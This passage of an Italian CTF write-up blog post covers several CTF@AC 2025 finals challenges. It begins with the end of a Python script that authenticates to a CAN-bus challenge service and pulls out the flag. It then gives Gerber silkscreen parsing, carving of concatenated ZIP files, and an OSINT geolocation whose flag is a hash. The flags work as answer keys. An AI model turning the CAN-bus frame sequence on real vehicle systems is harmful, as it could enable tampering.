</span></span><span class="line"><span class="cl">        <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="n">auth_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x608</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xD3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Authentication failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seq_counter</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq_counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 3: state commands (send twice)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x708</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x79</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;State command rejected&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 4: request flag chunks</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">can_id</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x7FF</span><span class="p">,</span> <span class="p">[</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">offset</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x7F8</span> <span class="ow">or</span> <span class="n">length</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xF1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Flag request rejected&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag_bytes</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">flag_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="baby-board">Baby Board<a hidden class="anchor" aria-hidden="true" href="#baby-board">#</a></h3>
<h4 id="analisi-19">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-19">#</a></h4>
<p>Ci √® stato dato uno ZIP di <strong>file Gerber di fabbricazione</strong> (<code>Gerber_PCB1_2025-11-08.zip</code>), gli output CAM standard per la produzione PCB (rame, solder mask, serigrafia, fori, ecc.). I Gerber sono semplici istruzioni da plotter: move/draw con aperture, un file per layer. Le flag nelle CTF ‚Äúhardware‚Äù sono spesso nascoste nella <strong>serigrafia top</strong> (legenda componenti) o nel rame.</p>
<p>Senza un servizio da testare, era un puro task di ispezione/formato. I luoghi probabili della flag, in ordine:</p>
<ol>
<li><strong>Top Silkscreen</strong> (<code>*.GTO</code>)</li>
<li><strong>Bottom Silkscreen</strong> (<code>*.GBO</code>)</li>
<li><strong>Layer di rame</strong> (es. <code>*.GTL</code>, <code>*.GBL</code>) come testo a spazio negativo</li>
<li><strong>Sagoma scheda</strong> / layer meccanici (<code>*.GKO</code>, <code>*.GML</code>)</li>
<li>Note drill/map</li>
</ol>
<h4 id="soluzione-16">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-16">#</a></h4>
<p>Ho aperto l‚Äôarchivio e ispezionato il file <strong>Top Silkscreen</strong> (<code>Gerber_TopSilkscreenLayer.GTO</code>). Si possono vedere i Gerber con una GUI (es. <code>gerbv</code>, Gerber Viewer di KiCad o InteractiveHtmlBom), ma ho fatto anche un parser/plotter rapido per sicurezza.</p>
<p>Il file usa costrutti RS-274X comuni:</p>
<ul>
<li><strong>Unit√†:</strong> mm (<code>MOMM</code>)</li>
<li><strong>Formato:</strong> ad es. <code>FSLAX45Y45</code> -&gt; X/Y hanno 4 cifre intere + 5 decimali</li>
<li><strong>Move/Draw:</strong> <code>D02</code> = move (penna su), <code>D01</code> = draw (penna gi√π), tipicamente con <code>G01</code> per interpolazione lineare</li>
</ul>
<p>Plottando in ordine i comandi <code>G01 X... Y... D..*</code>, compaiono i <strong>tratti vettoriali</strong> del testo serigrafico. Zoomando l‚Äôarea superiore della scheda, si vede la flag resa come testo outline.</p>
<p>Ho esportato un‚Äôanteprima zoomata della serigrafia che mostra la flag:</p>
<p><img alt="Serigrafia zoom con flag" loading="lazy" src="/images/silkscreen.png"></p>
<h4 id="script-15">Script<a hidden class="anchor" aria-hidden="true" href="#script-15">#</a></h4>
<p>Snippet Python minimale per parsare e visualizzare i tratti dal file GTO (serigrafia). Estrae i move lineari <code>G01</code>, interpreta <code>D02</code>/<code>D01</code> (move/draw), scala in mm e plotta:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s2">&#34;/mnt/data/Gerber_PCB1_2025-11-08.zip&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gto</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;Gerber_TopSilkscreenLayer.GTO&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scale</span> <span class="o">=</span> <span class="mf">1e5</span>  <span class="c1"># per FSLAX45Y45 (formato 4.5)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cmds</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">gto</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;G01&#34;</span><span class="p">):</span>  <span class="c1"># solo movimenti lineari</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;G01X(-?\d+)Y(-?\d+)D(\d+)\*&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">/</span><span class="n">scale</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span><span class="o">/</span><span class="n">scale</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmds</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">segments</span><span class="p">,</span> <span class="n">last</span> <span class="o">=</span> <span class="p">[],</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>          <span class="c1"># D02: move (penna su)</span>
</span></span><span class="line"><span class="cl">        <span class="n">last</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">d</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>        <span class="c1"># D01: draw (penna gi√π)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">last</span><span class="p">:</span> <span class="n">segments</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">last</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">last</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">last</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x0</span><span class="p">,</span><span class="n">y0</span><span class="p">,</span><span class="n">x1</span><span class="p">,</span><span class="n">y1</span> <span class="ow">in</span> <span class="n">segments</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">([</span><span class="n">x0</span><span class="p">,</span><span class="n">x1</span><span class="p">],[</span><span class="n">y0</span><span class="p">,</span><span class="n">y1</span><span class="p">],</span> <span class="n">linewidth</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">gca</span><span class="p">()</span><span class="o">.</span><span class="n">set_aspect</span><span class="p">(</span><span class="s1">&#39;equal&#39;</span><span class="p">,</span> <span class="n">adjustable</span><span class="o">=</span><span class="s1">&#39;box&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">gca</span><span class="p">()</span><span class="o">.</span><span class="n">invert_yaxis</span><span class="p">()</span>  <span class="c1"># comune nei viewer PCB</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s2">&#34;Top Silkscreen ‚Äì zoom&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">xlabel</span><span class="p">(</span><span class="s2">&#34;mm&#34;</span><span class="p">);</span> <span class="n">plt</span><span class="o">.</span><span class="n">ylabel</span><span class="p">(</span><span class="s2">&#34;mm&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">tight_layout</span><span class="p">();</span> <span class="n">plt</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
</span></span></code></pre></div><h2 id="forensics-">Forensics ü§ñ<a hidden class="anchor" aria-hidden="true" href="#forensics-">#</a></h2>
<h3 id="fire-and-ice">Fire and Ice<a hidden class="anchor" aria-hidden="true" href="#fire-and-ice">#</a></h3>
<h4 id="analisi-20">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-20">#</a></h4>
<p>La challenge fornisce un unico file, <code>adofai.zip</code>, che contiene un <code>flag.txt</code> con una flag non valida.
Usando unzip si vede che c‚Äô√® qualche altro dato concatenato allo zip.</p>
<pre tabindex="0"><code>warning [adofai.zip]: 453 extra bytes at beginning or within zipfile
</code></pre><p>Byte extra di solito significano che un altro archivio (o dati arbitrari) √® concatenato in coda al file. Nel nostro caso era un altro zip che conteneva un altro <code>flag.txt</code>.</p>
<h4 id="soluzione-17">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-17">#</a></h4>
<p>Questi sono i passi seguiti per ottenere la flag:</p>
<ol>
<li>
<p><strong>Ispezione iniziale</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip -l adofai.zip
</span></span></code></pre></div><p>L‚Äôoutput elenca un solo <code>flag.txt</code>, ma l‚Äôavviso sui ‚Äúbyte extra‚Äù √® l‚Äôindizio chiave.</p>
</li>
<li>
<p><strong>Confermare i dati in coda</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z l adofai.zip
</span></span></code></pre></div><p>7-Zip riporta <code>Tail Size = 453</code>, cio√® ci sono 453 byte aggiuntivi dopo la struttura ZIP normale. Quei dati sono un altro archivio ZIP.</p>
</li>
<li>
<p><strong>Carving degli zip</strong>
I file ZIP terminano con un record End-of-Central-Directory (EOCD) che inizia con la firma <code>PK\x05\x06</code>. L‚Äôidea √®:</p>
<ul>
<li>Trovare l‚ÄôEOCD nel file.</li>
<li>Copiare tutto dall‚Äôinizio del file fino all‚ÄôEOCD in un buffer a parte.</li>
<li>Trattare quel buffer come uno ZIP autonomo e leggerne i contenuti.</li>
<li>Spostare l‚Äôoffset in avanti e ripetere finch√© il file originale √® esaurito.</li>
</ul>
<p>Il seguente snippet Python automatizza il processo:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s1">&#39;adofai.zip&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">chunk</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;PK</span><span class="se">\x05\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># ignature that sign the end of a zip file</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">22</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">comment_len</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">chunk</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">20</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">22</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">archive_len</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">22</span> <span class="o">+</span> <span class="n">comment_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">archive_bytes</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[:</span><span class="n">archive_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">archive_bytes</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">zf</span><span class="o">.</span><span class="n">namelist</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">contents</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="k">match</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;ctf\{[^}]+\}&#39;</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="k">match</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">offset</span> <span class="o">+=</span> <span class="n">archive_len</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>
<p><strong>Risultati</strong>
Eseguendo lo script stampa tre flag:</p>
<ul>
<li><code>ctf{a428cd995d7a8dcd690dbd138f6df56f9df9eaef4610b1747f5fc75c9d432f8f}</code></li>
<li><code>ctf{281dbf950ada8e90f9320071fd871af042fd67d3bdf94043640b9ae673d0c952}</code></li>
<li><code>ctf{6622d9c1a2f093f921c301f19374a568cf243c0b15646e43bcb7585af824dc63}</code></li>
</ul>
<p>Ogni .zip contiene un singolo <code>flag.txt</code>, quindi ci sono esattamente tre layer e tre flag.</p>
</li>
</ol>
<h2 id="osint-">OSINT üåè<a hidden class="anchor" aria-hidden="true" href="#osint-">#</a></h2>
<h3 id="fangs-overseas">Fangs overseas<a hidden class="anchor" aria-hidden="true" href="#fangs-overseas">#</a></h3>
<h4 id="analisi-21">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-21">#</a></h4>
<p>In questa challenge ci viene presentato Vlad da Debugger, un informatico che ha viaggiato e visitato una chiesa. Il nostro obiettivo √® trovare quale chiesa ha visitato.</p>
<p>Cercando sui social, ho trovato un profilo Instagram chiamato <code>vlad.da.debugger</code>. Nelle storie, una foto scattata all‚Äô<code>Aeroporto Internazionale Salgado Filho (Porto Alegre, Brasile)</code>, e nei post un‚Äôimmagine di un gatto con la seguente descrizione:</p>
<p><code>Found this little beast in my trip and took him for a walk for 36.4 km. Too bad that banks and churches aren't pet friendly. üòí</code></p>
<h4 id="soluzione-18">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-18">#</a></h4>
<p>Sapendo che era in quell‚Äôaeroporto e ha viaggiato altri 36,4 km, ho cercato chiese entro un raggio di circa <code>36,4 km</code> dall‚Äôaeroporto e ho trovato la <code>Catedral Bas√≠lica S√£o Lu√≠s Gonzaga</code>, con coordinate -29.68, -51.13.
Secondo il formato della flag CTF{SHA256(lat,lon)}, la flag √®:</p>
<p><code>CTF{2516ec825f263d3348127605e0091317f0cd94509055affb67ca09cb4304c301}.</code></p>
<h4 id="script-16">Script<a hidden class="anchor" aria-hidden="true" href="#script-16">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;-29.68,-51.13&#34;</span> <span class="p">|</span> sha256sum
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://pascalctf.github.io/it/tags/ctfatac/">Ctfatac</a></li>
      <li><a href="https://pascalctf.github.io/it/tags/ctf/">Ctf</a></li>
      <li><a href="https://pascalctf.github.io/it/tags/binary/">Binary</a></li>
      <li><a href="https://pascalctf.github.io/it/tags/crypto/">Crypto</a></li>
      <li><a href="https://pascalctf.github.io/it/tags/web/">Web</a></li>
      <li><a href="https://pascalctf.github.io/it/tags/ctfatac2025/">Ctfatac2025</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://pascalctf.github.io/it/ctf/ctfatac2025_quals/">
    <span class="title">Successivo ¬ª</span>
    <br>
    <span>CTF@AC 2025 Qualifiche</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on x"
            href="https://x.com/intent/tweet/?text=Finali%20CTF%40AC%202025&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f&amp;hashtags=ctfatac%2cctf%2cbinary%2ccrypto%2cweb%2cctfatac2025">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f&amp;title=Finali%20CTF%40AC%202025&amp;summary=Finali%20CTF%40AC%202025&amp;source=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f&title=Finali%20CTF%40AC%202025">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
